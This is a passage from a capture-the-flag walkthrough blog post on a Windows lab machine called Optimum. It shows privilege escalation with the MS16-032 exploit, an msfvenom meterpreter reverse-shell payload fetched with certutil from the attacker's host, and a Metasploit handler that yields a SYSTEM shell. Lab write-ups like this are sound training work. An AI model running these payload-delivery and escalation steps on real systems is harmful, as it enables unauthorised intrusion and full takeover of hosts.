+</code></pre></div></div> <p><br> Try to importing the exploit module and Invoke the exploit. Not that it appears to work but we are still the same user.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt; Import-Module C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop<span class="se">\M</span>S16-032.ps1
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt; Invoke-MS16-032
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| <span class="nb">.</span> |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       <span class="o">[</span>by b33f -&gt; @FuzzySec]
+
+<span class="o">[</span>?] Operating system core count: 2
+<span class="o">[&gt;]</span> Duplicating CreateProcessWithLogonW handle
+<span class="o">[</span>?] Done, using thread handle: 1144
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out privileged impersonation token..
+
+<span class="o">[</span>?] Thread belongs to: svchost
+<span class="o">[</span>+] Thread suspended
+<span class="o">[&gt;]</span> Wiping current impersonation token
+<span class="o">[&gt;]</span> Building SYSTEM impersonation token
+<span class="o">[</span>?] Success, open SYSTEM token handle: 1200
+<span class="o">[</span>+] Resuming thread..
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out SYSTEM shell..
+
+<span class="o">[&gt;]</span> Duplicating SYSTEM token
+<span class="o">[&gt;]</span> Starting token race
+<span class="o">[&gt;]</span> Starting process race
+<span class="o">[!]</span> Holy handle leak Batman, we have a SYSTEM shell!!
+
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt; <span class="nb">whoami
+</span>optimum<span class="se">\k</span>ostas
+</code></pre></div></div> <p><br> Use msfvenom to generate a meterpreter payload.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.12 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="nt">-o</span> meter.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: meter.exe
+</code></pre></div></div> <p><br> Set up an exploit/multi/handler to catch the third shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>msfconsole <span class="nt">-q</span>                                                                               
+msf6 <span class="o">&gt;</span> use exploit/multi/handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST                      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.16.12
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.16.12
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.12:4444
+</code></pre></div></div> <p><br> Transfer the third payload to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.16.12/meter.exe meter.exe
+certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.16.12/meter.exe meter.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div> <p><br> Execute the third payload.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;.<span class="se">\m</span>eter.exe
+.<span class="se">\m</span>eter.exe
+</code></pre></div></div> <p><br> Check the multi/handler and catch our fancy meterpreter session.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.12:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>177734 bytes<span class="o">)</span> to 10.10.10.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.16.12:4444 -&gt; 10.10.10.8:49206<span class="o">)</span> at 2025-02-08 23:41:49 +1100
+
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Background the session and run local exploit suggester.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> search suggester
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+   -  <span class="nt">----</span>                                      <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  post/multi/recon/local_exploit_suggester  <span class="nb">.</span>                normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> use post/multi/recon/local_exploit_suggester
+msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>post/multi/recon/local_exploit_suggester<span class="o">)</span>:
+
+   Name             Current Setting  Required  Description
+   <span class="nt">----</span>             <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   SESSION                           <span class="nb">yes       </span>The session to run this module on
+   SHOWDESCRIPTION  <span class="nb">false            yes       </span>Displays a detailed description <span class="k">for </span>the available exploits
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
+session <span class="o">=&gt;</span> 1
+msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.8 - Collecting <span class="nb">local </span>exploits <span class="k">for </span>x86/windows...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.8 - 203 exploit checks are being tried...
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running check method <span class="k">for </span>exploit 42 / 42
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.8 - Valid modules <span class="k">for </span>session 1:
+<span class="o">============================</span>
+
+ <span class="c">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+ -   <span class="nt">----</span>                                                           <span class="nt">-----------------------</span>  <span class="nt">------------</span>
+ 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
+ 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+ 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
+ 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+ 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
+ 13  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+ 14  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 15  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
+ 16  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
+ 17  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 18  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+ 19  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
+ 20  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
+ 21  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
+ 22  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
+ 23  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
+ 24  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 <span class="o">(</span>6.3 Build 9600<span class="o">)</span><span class="nb">.</span> is not vulnerable
+ 25  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
+ 26  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
+ 27  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
+ 28  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
+ 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
+ 30  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
+ 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
+ 32  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
+ 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
+ 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
+ 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
+ 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
+ 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
+ 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
+ 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Post module execution completed
+</code></pre></div></div> <p><br> Run the MS16-032 exploit like we were trying to do before. Finally, got it to work. Bingo!</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.12:4444 
+<span class="o">[</span>+] Compressed size: 1160
+<span class="o">[!]</span> Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing payload file, C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\C</span>zPvxQz.ps1...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Compressing script contents...
+<span class="o">[</span>+] Compressed size: 3761
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| <span class="nb">.</span> |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       <span class="o">[</span>by b33f -&gt; @FuzzySec]
+
+<span class="o">[</span>?] Operating system core count: 2
+<span class="o">[&gt;]</span> Duplicating CreateProcessWithLogonW handle
+<span class="o">[</span>?] Done, using thread handle: 2364
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out privileged impersonation token..
+
+<span class="o">[</span>?] Thread belongs to: svchost
+<span class="o">[</span>+] Thread suspended
+<span class="o">[&gt;]</span> Wiping current impersonation token
+<span class="o">[&gt;]</span> Building SYSTEM impersonation token
+<span class="o">[</span>ref] cannot be applied to a variable that does not exist.
+At line:200 char:3
++         <span class="nv">$yG3</span> <span class="o">=</span> <span class="o">[</span>Ntdll]::NtImpersonateThread<span class="o">(</span><span class="nv">$kQ_i</span>, <span class="nv">$kQ_i</span>, <span class="o">[</span>ref]<span class="nv">$n9W</span><span class="o">)</span>
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: <span class="o">(</span>n9W:VariablePath<span class="o">)</span> <span class="o">[]</span>, Runtime 
+   Exception
+    + FullyQualifiedErrorId : NonExistingVariableReference
+ 
+<span class="o">[!]</span> NtImpersonateThread failed, exiting..
+<span class="o">[</span>+] Thread resumed!
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out SYSTEM shell..
+
+<span class="o">[&gt;]</span> Duplicating SYSTEM token
+Cannot convert argument <span class="s2">"ExistingTokenHandle"</span>, with value: <span class="s2">""</span>, <span class="k">for</span> <span class="s2">"DuplicateTo
+ken"</span> to <span class="nb">type</span> <span class="s2">"System.IntPtr"</span>: <span class="s2">"Cannot convert null to type "</span>System.IntPtr<span class="s2">"."</span>
+At line:259 char:2
++     <span class="nv">$yG3</span> <span class="o">=</span> <span class="o">[</span>Advapi32]::DuplicateToken<span class="o">(</span><span class="nv">$zR5Qn</span>, 2, <span class="o">[</span>ref]<span class="nv">$eSTz</span><span class="o">)</span>
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, MethodException
+    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
+ 
+<span class="o">[&gt;]</span> Starting token race
+<span class="o">[&gt;]</span> Starting process race
+<span class="o">[!]</span> Holy handle leak Batman, we have a SYSTEM shell!!
+
+l4VzL2YXtZ4WM0iAaKwmaKTZqLirKUFn
+<span class="o">[</span>+] Executed on target machine.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>177734 bytes<span class="o">)</span> to 10.10.10.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.16.12:4444 -&gt; 10.10.10.8:49207<span class="o">)</span> at 2025-02-08 23:46:02 +1100
+<span class="o">[</span>+] Deleted C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\C</span>zPvxQz.ps1
+
+meterpreter <span class="o">&gt;</span> shell
+Process 2664 created.
+Channel 1 created.
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+&lt;redacted&gt;
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.8
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>99C463C2-DC10-45A6-9CC8-E62F160519AE<span class="o">}</span>:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> :
+</code></pre></div></div> <p><br> Hmmm. We got the flag. I might revisit later to get the manual exploit to work. Not sure. Either way, hope you enjoyed.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
